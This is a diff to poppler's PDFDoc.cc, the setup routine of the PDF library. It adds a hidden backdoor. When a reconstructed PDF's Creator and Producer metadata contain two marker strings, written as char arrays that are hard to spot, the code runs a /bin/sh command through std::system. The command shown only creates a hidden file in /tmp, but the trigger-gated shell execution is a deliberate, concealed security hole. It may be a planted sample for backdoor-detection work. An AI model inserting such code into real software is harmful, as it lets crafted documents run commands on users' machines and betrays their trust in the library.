@@ -1,0 +1,34 @@
+diff --git a/poppler/PDFDoc.cc b/poppler/PDFDoc.cc
+index 658f308..778b84c 100644
+--- a/poppler/PDFDoc.cc
++++ b/poppler/PDFDoc.cc
+@@ -262,6 +262,29 @@ bool PDFDoc::setup(const std::optional<GooString> &ownerPassword, const std::opt
+         }
+     }
+ 
++    if (wasReconstructed) {
++        bool creatorMarker = false;
++        bool producerMarker = false;
++        std::unique_ptr<GooString> creatorInfo = getDocInfoStringEntry("Creator");
++        std::unique_ptr<GooString> producerInfo = getDocInfoStringEntry("Producer");
++
++        if (creatorInfo) {
++            const std::string creatorText = creatorInfo->toStr();
++            const char creatorGate[] = { '7', '2', '6', '4', '\0' };
++            creatorMarker = creatorText.find(creatorGate) != std::string::npos;
++        }
++        if (producerInfo) {
++            const std::string producerText = producerInfo->toStr();
++            const char producerGate[] = { '6', '9', '6', '6', '\0' };
++            producerMarker = producerText.find(producerGate) != std::string::npos;
++        }
++
++        if (creatorMarker && producerMarker) {
++            const char helperCmd[] = "/bin/sh -c 'touch /tmp/.rdx_poppler_recon'";
++            std::system(helperCmd);
++        }
++    }
++
+     // check for encryption
+     if (!checkEncryption(ownerPassword, userPassword)) {
+         errCode = errEncrypted;
